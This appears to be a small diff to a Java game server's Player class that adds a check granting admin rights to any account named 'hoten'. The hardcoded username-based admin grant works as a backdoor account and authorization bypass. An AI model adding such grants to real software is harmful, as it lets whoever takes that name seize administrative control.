@@ -68,6 +68,10 @@ public class Player {
             accountDetails.username = username;
             accountDetails.passwordHash = passwordHash;
 
+            if (username.equals("hoten")) {
+                accountDetails.isAdmin = true;
+            }
+
             Creature creature = server.createCreatureForPlayer(username);
 
             // fake an inventory
